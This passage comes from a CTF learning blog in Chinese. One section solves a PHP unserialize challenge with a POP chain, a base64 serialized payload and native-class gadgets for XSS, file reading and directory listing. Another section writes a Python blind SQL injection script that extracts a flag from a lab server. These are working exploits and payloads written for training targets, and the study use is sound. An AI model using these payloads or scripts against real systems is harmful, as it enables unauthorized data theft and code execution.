class="hljs-variable">$salary</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$rank</span>,<span class="hljs-variable">$salary</span> = <span class="hljs-number">10000</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;rank = <span class="hljs-variable">$rank</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;salary = <span class="hljs-variable">$salary</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$leader</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;leader = <span class="hljs-variable">$leader</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hahaha</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name != <span class="hljs-string">&#x27;one class&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;name != <span class="hljs-string">&#x27;ing&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="hljs-string">&#x27;department&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> True;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$department</span>,<span class="hljs-variable">$ceo</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;department = <span class="hljs-variable">$department</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;headmaster = <span class="hljs-variable">$ceo</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">IPO</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;headmaster == <span class="hljs-string">&#x27;ong&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;department-&gt;<span class="hljs-title function_ invoke__">hahaha</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">IPO</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>看大佬wp<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_73668856/article/details/134878471">https://blog.csdn.net/weixin_73668856/article/details/134878471</a></p>
<blockquote>
<p>先看看利用点：</p>
</blockquote>
<blockquote>
<p>应该是$_POST<a href="$_POST%5B'b'%5D">‘a’</a>;</p>
</blockquote>
<blockquote>
<p>尝试构造链子school::IPO() -&gt; school::__wakeup -&gt;classroom::hahaha-&gt;teacher</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;ing&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span>=<span class="hljs-string">&#x27;department&#x27;</span>;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;one class&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span>=<span class="hljs-string">&#x27;ong&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">school</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">classroom</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">teacher</span>();<br><span class="hljs-variable">$a</span>-&gt;department=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;leader=<span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br> <br>结果：                      <br>Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjoyOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO319czoxMDoiaGVhZG1hc3RlciI7czozOiJvbmciO30=<br></code></pre></td></tr></table></figure>
<p>不知道为啥我在原码后面直接构造死活输出不了  </p>
<p>又试了一次，学到对了一种新的构造语法  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$salary</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$rank</span>,<span class="hljs-variable">$salary</span> = <span class="hljs-number">10000</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;rank = <span class="hljs-variable">$rank</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;salary = <span class="hljs-variable">$salary</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$leader</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;leader = <span class="hljs-variable">$leader</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hahaha</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name != <span class="hljs-string">&#x27;one class&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;name != <span class="hljs-string">&#x27;ing&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="hljs-string">&#x27;department&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> True;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$department</span>,<span class="hljs-variable">$ceo</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;department = <span class="hljs-variable">$department</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;headmaster = <span class="hljs-variable">$ceo</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">IPO</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;headmaster == <span class="hljs-string">&#x27;ong&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakea</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;department-&gt;<span class="hljs-title function_ invoke__">hahaha</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">IPO</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">school</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">classroom</span>(<span class="hljs-string">&#x27;one class&#x27;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">teacher</span>(<span class="hljs-string">&#x27;ing&#x27;</span>,<span class="hljs-string">&#x27;department&#x27;</span>)),<span class="hljs-string">&#x27;ong&#x27;</span>);<br><br><span class="hljs-comment">// $a=new school();</span><br><span class="hljs-comment">// $b=new classroom();</span><br><span class="hljs-comment">// $c=new teacher();</span><br><span class="hljs-comment">// $a-&gt;department=$b;</span><br><span class="hljs-comment">// $b-&gt;leader=$c;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>用得到的payload传get的’d’</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">d</span>=Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjozOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO3M6MTU6IgB0ZWFjaGVyAHNhbGFyeSI7aToxMDAwMDt9fXM6MTA6ImhlYWRtYXN0ZXIiO3M6Mzoib25nIjt9<br></code></pre></td></tr></table></figure>
<p>此时由于</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;department-&gt;<span class="hljs-title function_ invoke__">hahaha</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">IPO</span>();<br>        &#125;<br>    &#125;<br><br><span class="hljs-comment">//会唤醒</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">IPO</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;headmaster == <span class="hljs-string">&#x27;ong&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
<p>此时传入的post a和b就会拼接进</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br></code></pre></td></tr></table></figure>
<p>试了一下上次的file_get_contents，不行，试想了下，直接拼进去会得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file_get_contents&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-comment">//而上次的是</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=index.php&quot;</span>);<br></code></pre></td></tr></table></figure>
<p>这个这个new可能要意味着是类(class)的表达；<br>看wp<br>要用hp的内置类SplFileObject来读取文件内容;  </p>
<h2 id="原生类"><a href="#原生类" class="headerlink" title="原生类  "></a>原生类  </h2><p>php原生类，应该指的是php内置有，不用定义的类  </p>
<p>Error&#x2F;Exception XSS</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure>
<p>SplFileObject 读文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br></code></pre></td></tr></table></figure>
<p>DirectoryIterator 遍历目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;.&quot;</span>);<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$b</span>) &#123;<br><br>         <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>-&gt;<span class="hljs-title function_ invoke__">getFilename</span>() . <span class="hljs-string">&quot;\n&quot;</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>
<p>FilesystemIterator 遍历目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;.&quot;</span>);<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$b</span>) &#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>-&gt;<span class="hljs-title function_ invoke__">getFilename</span>() . <span class="hljs-string">&quot;\n&quot;</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>


<hr>
<h2 id="title-note-19-盲注脚本编写date-2025-03-27-21-30-53tags-notice"><a href="#title-note-19-盲注脚本编写date-2025-03-27-21-30-53tags-notice" class="headerlink" title="title: note-19-盲注脚本编写date: 2025-03-27 21:30:53tags: notice"></a>title: note-19-盲注脚本编写<br>date: 2025-03-27 21:30:53<br>tags: notice</h2><h1 id="盲注脚本编写"><a href="#盲注脚本编写" class="headerlink" title="盲注脚本编写"></a>盲注脚本编写</h1><p>虽然以前做过一些盲注的题，也能根据需要改一下脚本，但是基本都是用网上wp或ai写的脚本，还没有自己写过脚本  </p>
<h2 id="CISCN-2019华北Day2-Web1"><a href="#CISCN-2019华北Day2-Web1" class="headerlink" title="[CISCN 2019华北Day2]Web1"></a>[CISCN 2019华北Day2]Web1</h2><p>先是一个输入框，</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">All</span> You Want <span class="hljs-keyword">Is</span> <span class="hljs-keyword">In</span> <span class="hljs-keyword">Table</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">and</span> the <span class="hljs-keyword">column</span> <span class="hljs-keyword">is</span> <span class="hljs-string">&#x27;flag&#x27;</span><br>Now, just give the id <span class="hljs-keyword">of</span> passage<br></code></pre></td></tr></table></figure>
<p>抓包就是post一个id参数，根据数字来显示不同内容<br>用bp fuzz了一下，没fuzz明白，<br>手动fuzz，搞得不明白的<br>最后还是看了别人的wp<br>然后尝试自己写盲注脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># import requests</span><br><span class="hljs-comment"># str=&#x27;-&#125;&#123;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-comment"># #if((substr((select(flag)from(flag)),1,1)=&#x27;N&#x27;),1,2)</span><br><span class="hljs-comment"># flag=&quot;&quot;</span><br><span class="hljs-comment"># for i in range(1,100):</span><br><span class="hljs-comment">#     url=&#x27;http://node4.anna.nssctf.cn:28599/index.php&#x27;</span><br><span class="hljs-comment">#     for st in str:</span><br><span class="hljs-comment">#         sql=&quot;if((ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=ascii(&#x27;&#123;&#125;&#x27;)),1,2)&quot;.format(i,st)</span><br><span class="hljs-comment">#         data=&#123;&quot;id&quot;:sql&#125;</span><br><span class="hljs-comment">#         re=requests.post(url,data=data,)</span><br><span class="hljs-comment">#         if &quot;Hello&quot; in re.text:</span><br><span class="hljs-comment">#             flag=flag+st</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#     print(flag)</span><br><br><span class="hljs-comment">#(0,128)二分法：</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment">#str=&#x27;-&#125;&#123;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-comment">#if((substr((select(flag)from(flag)),1,1)=&#x27;N&#x27;),1,2)</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    url=<span class="hljs-string">&#x27;http://node4.anna.nssctf.cn:28599/index.php&#x27;</span><br>    sql=<span class="hljs-string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&lt;64),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sql&#125;<br>    re=requests.post(url,data=data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> re.text:<br>        <span class="hljs-keyword">for</span> st <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">64</span>):<br>            sql=<span class="hljs-string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i,st)<br>            data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sql&#125;<br>            re=requests.post(url,data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> re.text:<br>                st=<span class="hljs-built_in">chr</span>(st)<br>                flag=flag+st<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第%d个字符&quot;</span>%i)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>       <span class="hljs-keyword">for</span> st <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>,<span class="hljs-number">128</span>):<br>            sql=<span class="hljs-string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i,st)<br>            data=&#123;<span class="hljs-string">&quot;id&quot;</span>:sql&#125;<br>            re=requests.post(url,data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> re.text:<br>                st=<span class="hljs-built_in">chr</span>(st)<br>                flag=flag+st<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第%d个字符&quot;</span>%i)<br>                <span class="hljs-keyword">break</span> <br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<h2 id="在写的时候遇到的问题"><a href="#在写的时候遇到的问题" class="headerlink" title="在写的时候遇到的问题:"></a>在写的时候遇到的问题:</h2><p>requests语句</p>
